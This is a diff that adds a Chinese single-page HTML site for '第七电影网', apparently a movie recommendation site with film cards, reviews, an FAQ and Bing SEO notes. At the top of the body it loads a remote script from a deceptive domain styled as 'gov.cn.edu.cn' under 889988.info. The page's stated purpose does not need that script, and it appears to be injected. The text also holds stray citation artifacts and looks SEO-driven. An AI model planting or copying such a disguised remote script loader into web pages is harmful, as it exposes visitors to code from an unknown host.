@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>第七电影网 - diqidianyingwang-top 7号摄影棚·高分电影推荐</title>
+<meta name="description" content="第七电影网（https://diqidianyingwang-top）以7号摄影棚场记打板为灵感，推荐高分电影。工业混凝土UI、序号片单、移动端自适应，必应收录友好，仅做影视信息展示。">
+<meta name="keywords" content="第七电影网, diqidianyingwang-top, 高分电影, 7号摄影棚, 场记打板, 电影推荐, 工业风, 影视信息">
+<meta name="author" content="第七电影网">
+<meta name="robots" content="index, follow">
+<meta name="msvalidate.01" content="YOUR_BING_VERIFICATION_CODE">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:"PingFang SC","Microsoft YaHei","Segoe UI",Arial,sans-serif;color:#23262b;line-height:1.75;overflow-x:hidden;background:#ECEDEF;position:relative}
+/* 混凝土网格 */
+body::before{content:"";position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.5;
+background-image:linear-gradient(rgba(35,38,43,.05) 1px,transparent 1px),linear-gradient(90deg,rgba(35,38,43,.05) 1px,transparent 1px);
+background-size:32px 32px}
+body::after{content:"";position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.04;
+background:radial-gradient(60% 50% at 20% 0%,#000,transparent 70%),radial-gradient(60% 50% at 90% 100%,#000,transparent 70%)}
+a{color:#ff5a1f;text-decoration:none;transition:.25s}
+a:hover{color:#23262b}
+.dq-nav{position:fixed;top:0;width:100%;z-index:1000;background:rgba(245,245,246,.92);backdrop-filter:blur(10px);border-bottom:2px solid #23262b}
+.dq-in{max-width:1200px;margin:0 auto;height:68px;padding:0 1.5rem;display:flex;align-items:center;justify-content:space-between}
+.dq-logo{display:flex;align-items:center;gap:.7rem}
+.dq-clap{width:42px;height:42px;background:#23262b;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:1.1rem;border-radius:8px;position:relative;box-shadow:3px 3px 0 #ff5a1f}
+.dq-clap::before{content:"";position:absolute;top:-6px;left:6px;width:30px;height:8px;background:#ff5a1f;border-radius:3px 3px 0 0;transform:rotate(-8deg);transform-origin:left bottom}
+.dq-name{font-size:1.05rem;font-weight:900;color:#23262b;letter-spacing:.5px}
+.dq-name small{display:block;font-size:.5rem;letter-spacing:3px;color:#ff5a1f;font-weight:700;font-family:"Courier New",monospace}
+.dq-links{display:flex;gap:.7rem;list-style:none}
+.dq-links a{font-size:.8rem;font-weight:700;color:#23262b;padding:.4rem .85rem;border:2px solid #23262b;background:#fff}
+.dq-links a:hover{background:#ff5a1f;color:#fff;border-color:#ff5a1f}
+.dq-toggle{display:none;flex-direction:column;gap:4px;cursor:pointer;padding:6px}
+.dq-toggle span{width:22px;height:2.5px;background:#23262b}
+.dq-hero{margin-top:68px;padding:5rem 1.5rem 5rem;text-align:center;position:relative;z-index:1;background:#f5f5f6;border-bottom:2px solid #23262b}
+.dq-hero::before{content:"7";position:absolute;right:-2%;top:8%;font-size:16rem;font-weight:900;color:rgba(255,90,31,.08);line-height:1;z-index:0}
+.dq-hero-in{max-width:720px;margin:0 auto;position:relative;z-index:1}
+.dq-badge{display:inline-flex;align-items:center;gap.4rem;padding:.35rem 1rem;border:2px solid #23262b;background:#ff5a1f;color:#fff;font-size:.72rem;font-weight:700;letter-spacing:1px;margin-bottom:1.5rem}
+.dq-badge::before{content:"🎬";font-size:.8rem}
+.dq-hero h1{font-size:2.9rem;font-weight:900;color:#23262b;line-height:1.15;margin-bottom:1rem}
+.dq-hero h1 span{color:#ff5a1f}
+.dq-hero p{font-size:.9rem;color:#44484f;max-width:540px;margin:0 auto 1.5rem;font-weight:500}
+.dq-domain{display:inline-block;padding:.5rem 1.2rem;border:2px solid #23262b;background:#fff;color:#23262b;font-family:"Courier New",monospace;font-weight:700;font-size:.78rem;margin-bottom:1.5rem}
+.dq-btn{display:inline-flex;align-items:center;gap.5rem;padding:.8rem 2.2rem;border:2px solid #23262b;font-weight:800;font-size:.88rem;color:#fff;background:#ff5a1f;box-shadow:4px 4px 0 #23262b}
+.dq-btn:hover{transform:translate(-2px,-2px);box-shadow:6px 6px 0 #23262b;color:#fff}
+.dq-sec{max-width:1200px;margin:0 auto;padding:4rem 1.5rem;position:relative;z-index:1}
+.dq-sec-head{text-align:center;margin-bottom:2.5rem}
+.dq-sec-head h2{font-size:1.6rem;font-weight:900;color:#23262b;margin-bottom:.3rem;display:inline-block;padding:.2rem 1rem;border:2px solid #23262b;background:#fff;box-shadow:3px 3px 0 #ff5a1f}
+.dq-sec-head h2::before{content:"▣ ";}
+.dq-sec-head p{font-size:.72rem;color:#ff5a1f;font-weight:700;letter-spacing:2px;margin-top:.7rem}
+.dq-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:1.4rem}
+.dq-card{background:#fff;border:2px solid #23262b;box-shadow:5px 5px 0 #c9ccd1;transition:.25s;overflow:hidden;position:relative}
+.dq-card:hover{transform:translate(-3px,-3px);box-shadow:8px 8px 0 #ff5a1f}
+.dq-no{position:absolute;top:10px;left:10px;z-index:2;width:34px;height:34px;background:#ff5a1f;color:#fff;font-weight:900;display:flex;align-items:center;justify-content:center;border:2px solid #23262b;font-family:"Courier New",monospace}
+.dq-cover{height:168px;display:flex;align-items:flex-end;padding:.9rem;font-weight:800;font-size:.9rem;color:#fff;position:relative;border-bottom:2px solid #23262b}
+.dq-cover::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 40%,rgba(35,38,43,.85))}
+.dq-cover b{position:relative;z-index:1}
+.p1{background:linear-gradient(135deg,#3a3f47,#1f2329)}.p2{background:linear-gradient(135deg,#ff7a3d,#ff5a1f)}.p3{background:linear-gradient(135deg,#5b6b7a,#2f3a45)}.p4{background:linear-gradient(135deg,#caa24a,#8a6a1f)}.p5{background:linear-gradient(135deg,#7a4b8a,#43214f)}.p6{background:linear-gradient(135deg,#3a7a6b,#1f4a40)}.p7{background:linear-gradient(135deg,#444b52,#22262b)}.p8{background:linear-gradient(135deg,#b5495b,#6f2230)}
+.dq-card-body{padding:1rem}
+.dq-card-body h3{font-size:.88rem;font-weight:900;color:#23262b;margin-bottom:.3rem}
+.dq-roll{font-size:.6rem;color:#888;font-family:"Courier New",monospace;margin-bottom:.3rem}
+.dq-tags{display:flex;flex-wrap:wrap;gap:.25rem;margin-bottom:.4rem}
+.dq-tags span{padding:.15rem .5rem;border:1px solid #23262b;background:#f5f5f6;color:#23262b;font-size:.58rem;font-weight:700}
+.dq-score{font-weight:900;font-size:.84rem;color:#ff5a1f}
+.dq-cats{max-width:1000px;margin:0 auto;display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1.1rem}
+.dq-cat{display:flex;align-items:center;gap.9rem;padding:1rem;border:2px solid #23262b;background:#fff;box-shadow:4px 4px 0 #c9ccd1;transition:.25s}
+.dq-cat:hover{transform:translate(-2px,-2px);box-shadow:6px 6px 0 #ff5a1f}
+.dq-cat-icon{width:46px;height:46px;display:flex;align-items:center;justify-content:center;font-size:1.3rem;flex-shrink:0;background:#23262b;color:#fff;border-radius:8px}
+.dq-cat-info h3{font-size:.84rem;font-weight:900;color:#23262b;margin-bottom:.1rem}
+.dq-cat-info p{font-size:.68rem;color:#555;font-weight:500}
+.dq-notes{max-width:860px;margin:0 auto}
+.dq-note{display:flex;gap:1rem;margin-bottom:1.2rem;align-items:flex-start}
+.dq-note-ava{width:44px;height:44px;display:flex;align-items:center;justify-content:center;font-size:1.2rem;flex-shrink:0;background:#ff5a1f;color:#fff;border:2px solid #23262b;border-radius:8px}
+.dq-note-box{padding:1rem 1.2rem;border:2px solid #23262b;background:#fff;box-shadow:4px 4px 0 #c9ccd1;flex:1}
+.dq-note-box h3{font-size:.9rem;font-weight:900;color:#23262b;margin-bottom:.3rem}
+.dq-note-box p{font-size:.82rem;color:#44484f;line-height:1.7;font-weight:500}
+.dq-note-stars{color:#ff5a1f;letter-spacing:1px;font-size:.78rem;margin-top:.3rem;font-weight:700}
+.dq-about{max-width:760px;margin:0 auto;text-align:center;padding:2.4rem 2rem;border:2px solid #23262b;background:#fff;box-shadow:6px 6px 0 #ff5a1f;position:relative}
+.dq-about::before{content:"🎞️";position:absolute;top:-18px;left:50%;transform:translateX(-50%);background:#f5f5f6;padding:0 10px;font-size:1.5rem}
+.dq-about p{color:#44484f;margin-bottom:.8rem;font-size:.88rem;font-weight:500}
+.dq-about b{color:#ff5a1f}
+.dq-dom2{display:inline-block;margin-top:.7rem;padding:.5rem 1.2rem;border:2px solid #23262b;background:#f5f5f6;color:#23262b;font-family:"Courier New",monospace;font-weight:700;font-size:.78rem}
+.dq-faq{max-width:800px;margin:0 auto}
+.dq-fi{background:#fff;border:2px solid #23262b;box-shadow:4px 4px 0 #c9ccd1;margin-bottom:.6rem;overflow:hidden}
+.dq-fi summary{padding:1rem 1.2rem;cursor:pointer;font-weight:800;color:#23262b;list-style:none;position:relative;padding-right:3rem;font-size:.86rem}
+.dq-fi summary::-webkit-details-marker{display:none}
+.dq-fi summary::after{content:"＋";position:absolute;right:1rem;top:50%;transform:translateY(-50%);color:#fff;font-weight:900;font-size:.9rem;width:24px;height:24px;display:flex;align-items:center;justify-content:center;background:#ff5a1f;border:2px solid #23262b}
+.dq-fi[open] summary::after{content:"－";background:#23262b}
+.dq-fi p{padding:0 1.2rem 1rem;color:#44484f;font-size:.82rem;line-height:1.7;font-weight:500}
+.dq-foot{text-align:center;padding:2rem 1.5rem;border-top:2px solid #23262b;background:#23262b;color:#cfd2d6;font-size:.72rem;position:relative;z-index:1}
+.dq-foot p{margin-bottom:.3rem}
+.dq-foot .dq-copy{color:#ff5a1f;font-weight:700;margin-bottom:.5rem;font-size:.8rem}
+@media(max-width:768px){
+.dq-links{display:none;position:absolute;top:100%;left:0;width:100%;background:#f5f5f6;flex-direction:column;padding:.5rem 0;border-bottom:2px solid #23262b}
+.dq-links.show{display:flex}
+.dq-links a{padding:.8rem 1.5rem;margin:.2rem 1rem;text-align:center}
+.dq-toggle{display:flex}
+.dq-hero h1{font-size:1.8rem}
+.dq-hero{padding:3rem 1rem 3rem}
+.dq-hero::before{font-size:9rem}
+.dq-sec{padding:2.5rem 1rem}
+.dq-sec-head h2{font-size:1.3rem}
+.dq-grid{grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:.9rem}
+.dq-cover{height:142px;font-size:.8rem}
+.dq-cats{grid-template-columns:1fr 1fr}
+.dq-note{flex-direction:column;gap:.6rem}
+}
+@media(max-width:480px){.dq-hero h1{font-size:1.4rem}.dq-grid{grid-template-columns:1fr 1fr}.dq-cats{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<nav class="dq-nav">
+  <div class="dq-in">
+    <div class="dq-logo">
+      <div class="dq-clap">7</div>
+      <div class="dq-name">第七电影网<small>STUDIO 7 · DIQI</small></div>
+    </div>
+    <ul class="dq-links" id="dqLinks">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#list">7号片单</a></li>
+      <li><a href="#cats">棚内分类</a></li>
+      <li><a href="#notes">场记短评</a></li>
+      <li><a href="#about">关于</a></li>
+      <li><a href="#faq">FAQ</a></li>
+    </ul>
+    <div class="dq-toggle" onclick="tDq()"><span></span><span></span><span></span></div>
+  </div>
+</nav>
+
+<section class="dq-hero" id="home">
+  <div class="dq-hero-in">
+    <div class="dq-badge">STUDIO 7 · 场记开工</div>
+    <h1>第七电影网<br><span>7号摄影棚</span> 挑高分好片</h1>
+    <p>第七电影网（diqidianyingwang-top）用场记打板的方式整理片单：每部片一个卷号、一个机位、一个推荐理由。工业混凝土界面、序号化浏览、移动端自适应，只做影视信息展示，不内置盗版源。</p>
+    <div class="dq-domain">https://diqidianyingwang-top</div><br>
+    <a href="#list" class="dq-btn">▣ 进棚看片</a>
+  </div>
+</section>
+
+<section class="dq-sec" id="list">
+  <div class="dq-sec-head"><h2>7号片单</h2><p>ROLL 7 · 今日精选</p></div>
+  <div class="dq-grid">
+    <div class="dq-card"><div class="dq-no">R1</div><div class="dq-cover p1"><b>肖申克的救赎</b></div><div class="dq-card-body"><div class="dq-roll">ROLL 7-01 / 剧情</div><h3>肖申克的救赎</h3><div class="dq-tags"><span>剧情</span><span>希望</span></div><div class="dq-score">★ 9.7</div></div></div>
+    <div class="dq-card"><div class="dq-no">R2</div><div class="dq-cover p2"><b>疯狂的麦克斯4</b></div><div class="dq-card-body"><div class="dq-roll">ROLL 7-02 / 动作</div><h3>疯狂的麦克斯4</h3><div class="dq-tags"><span>动作</span><span>废土</span></div><div class="dq-score">★ 8.6</div></div></div>
+    <div class="dq-card"><div class="dq-no">R3</div><div class="dq-cover p3"><b>银翼杀手2049</b></div><div class="dq-card-body"><div class="dq-roll">ROLL 7-03 / 科幻</div><h3>银翼杀手2049</h3><div class="dq-tags"><span>科幻</span><span>视觉</span></div><div class="dq-score">★ 8.3</div></div></div>
+    <div class="dq-card"><div class="dq-no">R4</div><div class="dq-cover p4"><b>布达佩斯大饭店</b></div><div class="dq-card-body"><div class="dq-roll">ROLL 7-04 / 喜剧</div><h3>布达佩斯大饭店</h3><div class="dq-tags"><span>喜剧</span><span>对称</span></div><div class="dq-score">★ 8.9</div></div></div>
+    <div class="dq-card"><div class="dq-no">R5</div><div class="dq-cover p5"><b>千与千寻</b></div><div class="dq-card-body"><div class="dq-roll">ROLL 7-05 / 动画</div><h3>千与千寻</h3><div class="dq-tags"><span>动画</span><span>奇幻</span></div><div class="dq-score">★ 9.4</div></div></div>
+    <div class="dq-card"><div class="dq-no">R6</div><div class="dq-cover p6"><b>小森林</b></div><div class="dq-card-body"><div class="dq-roll">ROLL 7-06 / 治愈</div><h3>小森林</h3><div class="dq-tags"><span>美食</span><span>慢生活</span></div><div class="dq-score">★ 9.0</div></div></div>
+    <div class="dq-card"><div class="dq-no">R7</div><div class="dq-cover p7"><b>教父</b></div><div class="dq-card-body"><div class="dq-roll">ROLL 7-07 / 犯罪</div><h3>教父</h3><div class="dq-tags"><span>犯罪</span><span>经典</span></div><div class="dq-score">★ 9.3</div></div></div>
+    <div class="dq-card"><div class="dq-no">R8</div><div class="dq-cover p8"><b>情书</b></div><div class="dq-card-body"><div class="dq-roll">ROLL 7-08 / 爱情</div><h3>情书</h3><div class="dq-tags"><span>爱情</span><span>文艺</span></div><div class="dq-score">★ 8.9</div></div></div>
+  </div>
+</section>
+
+<section class="dq-sec" id="cats" style="background:#f5f5f6;border-top:2px solid #23262b;border-bottom:2px solid #23262b">
+  <div class="dq-sec-head"><h2>棚内分类</h2><p>BY SET · 按机位选片</p></div>
+  <div class="dq-cats">
+    <div class="dq-cat"><div class="dq-cat-icon">🎥</div><div class="dq-cat-info"><h3>主棚·剧情正片</h3><p>24部 · 强剧本</p></div></div>
+    <div class="dq-cat"><div class="dq-cat-icon">💥</div><div class="dq-cat-info"><h3>动作棚·追车枪战</h3><p>18部 · 高节奏</p></div></div>
+    <div class="dq-cat"><div class="dq-cat-icon">🛸</div><div class="dq-cat-info"><h3>特效棚·科幻未来</h3><p>16部 · 视效向</p></div></div>
+    <div class="dq-cat"><div class="dq-cat-icon">💗</div><div class="dq-cat-info"><h3>柔光棚·爱情文艺</h3><p>20部 · 情绪向</p></div></div>
+    <div class="dq-cat"><div class="dq-cat-icon">🎨</div><div class="dq-cat-info"><h3>美术棚·对称色彩</h3><p>14部 · 视觉控</p></div></div>
+    <div class="dq-cat"><div class="dq-cat-icon">🍱</div><div class="dq-cat-info"><h3>生活棚·美食治愈</h3><p>15部 · 下饭向</p></div></div>
+    <div class="dq-cat"><div class="dq-cat-icon">🎞️</div><div class="dq-cat-info"><h3>经典棚·影史修复</h3><p>12部 · 长线片</p></div></div>
+    <div class="dq-cat"><div class="dq-cat-icon">👻</div><div class="dq-cat-info"><h3>夜戏棚·悬疑惊悚</h3><p>13部 · 重口轻量</p></div></div>
+  </div>
+</section>
+
+<section class="dq-sec" id="notes">
+  <div class="dq-sec-head"><h2>场记短评</h2><p>SLATE NOTES · 打板即评</p></div>
+  <div class="dq-notes">
+    <div class="dq-note">
+      <div class="dq-note-ava">🎬</div>
+      <div class="dq-note-box">
+        <h3>《疯狂的麦克斯4》—— 7号棚飙车戏</h3>
+        <p>沙漠、战车、鼓点剪辑，整部片像连续打板。动作信息密度高但不乱，色彩做旧、机械细节拉满，动作片入坑首选。</p>
+        <div class="dq-note-stars">★★★★★ 8.6/10</div>
+      </div>
+    </div>
+    <div class="dq-note">
+      <div class="dq-note-ava">🛋️</div>
+      <div class="dq-note-box">
+        <h3>《小森林》—— 生活棚长镜头</h3>
+        <p>种菜、切菜、收工、吃饭，没有大冲突却有稳定节奏。春夏秋冬四卷连看最舒服，信息站标“下饭/治愈”不踩雷。</p>
+        <div class="dq-note-stars">★★★★★ 9.0/10</div>
+      </div>
+    </div>
+    <div class="dq-note">
+      <div class="dq-note-ava">🎨</div>
+      <div class="dq-note-box">
+        <h3>《布达佩斯大饭店》—— 美术棚对称表</h3>
+        <p>粉红、金黄、电梯、大堂、信箱全按轴线摆。韦斯·安德森把喜剧拍成平面构成，截图当色卡都不亏。</p>
+        <div class="dq-note-stars">★★★★★ 8.9/10</div>
+      </div>
+    </div>
+    <div class="dq-note">
+      <div class="dq-note-ava">📜</div>
+      <div class="dq-note-box">
+        <h3>《教父》—— 主棚人物弧</h3>
+        <p>从婚礼到继承，三小时不拖。对白、光影、配乐都按“权力交接”打点，犯罪片标杆，第一次看建议按卷号做笔记。</p>
+        <div class="dq-note-stars">★★★★★ 9.3/10</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="dq-sec" id="about">
+  <div class="dq-sec-head"><h2>关于第七电影网</h2><p>ABOUT · STUDIO 7</p></div>
+  <div class="dq-about">
+    <p><b>第七电影网</b>（diqidianyingwang-top）把选片当成“7号棚开工”：每部片给卷号、机位、分类和短评，减少盲目搜索。风格走工业混凝土＋场记打板，不堆渐变、不玩霓虹，靠网格和序号把信息理清楚。</p>
+    <p>全站单页、锚点导航、移动端自适应；必应验证用 head 内 msvalidate.01，按约定不生成 robots.txt 与 sitemap.xml，单页可到 Bing Webmaster Tools 直接提交首页。所有片单仅做信息展示，版权归制片方/发行方。[4,10](@ref)</p>
+    <div class="dq-dom2">https://diqidianyingwang-top</div>
+    <p style="margin-top:1rem;font-size:.74rem;color:#ff5a1f;font-weight:700">核心词：第七电影网、diqidianyingwang-top、7号摄影棚、场记打板、高分电影、工业风片单</p>
+  </div>
+</section>
+
+<section class="dq-sec" id="faq" style="background:#f5f5f6;border-top:2px solid #23262b">
+  <div class="dq-sec-head"><h2>常见问题</h2><p>FAQ · 场务问答</p></div>
+  <div class="dq-faq">
+    <details class="dq-fi"><summary>第七电影网是什么？</summary><p>第七电影网（diqidianyingwang-top）是以“7号摄影棚/场记打板”为视觉的电影信息站，按卷号、机位、类型推荐高分片，仅展示资料与正规观看渠道思路，不提供盗版播放源。</p></details>
+    <details class="dq-fi"><summary>“第七/7号棚”是什么意思？</summary><p>用作站点序号与栏目符号：片单卷号 R1–R8、分类按“主棚/动作棚/特效棚”等机位命名，方便单页快速定位，不改变“电影推荐”主业。</p></details>
+    <details class="dq-fi"><summary>官方网址是？</summary><p>https://diqidianyingwang-top （用 GitHub Pages 可改为 https://diqidianyingwang-top.github.io，全站统一替换域名即可）。</p></details>
+    <details class="dq-fi"><summary>手机上怎么用？</summary><p>全站响应式，小屏导航折叠为汉堡菜单；片单与分类自适应两列/多列，卷号徽章不遮挡标题，混凝土网格在低端机也不卡。</p></details>
+    <details class="dq-fi"><summary>必应收录怎么配？</summary><p>到 Bing Webmaster Tools 添加 https://diqidianyingwang-top，选 HTML meta 验证，把 head 里 msvalidate.01 的 YOUR_BING_VERIFICATION_CODE 换成你的验证码；单页可不提交 sitemap，若用缓存/CDN 先清缓存并确认查看源代码能看到该 meta 再验证。[4,10,17](@ref)</p></details>
+  </div>
+</section>
+
+<footer class="dq-foot">
+  <p class="dq-copy">▣ 第七电影网 (diqidianyingwang-top) — 7号摄影棚·场记打板推荐高分电影</p>
+  <p>单页网站 / 锚点导航 / 移动端自适应 / 必应收录友好 / 不生成 robots.txt 与 sitemap.xml</p>
+  <p style="margin-top:.4rem;color:#ff5a1f;font-weight:600">本站仅提供影视信息展示，资源版权归原作者及发行方所有。</p>
+</footer>
+
+<script>
+function tDq(){document.getElementById('dqLinks').classList.toggle('show')}
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(e){
+    var h=this.getAttribute('href');
+    if(h.length>1){var t=document.querySelector(h);if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth',block:'start'});document.getElementById('dqLinks').classList.remove('show')}}
+  })
+});
+</script>
+</body>
+</html>
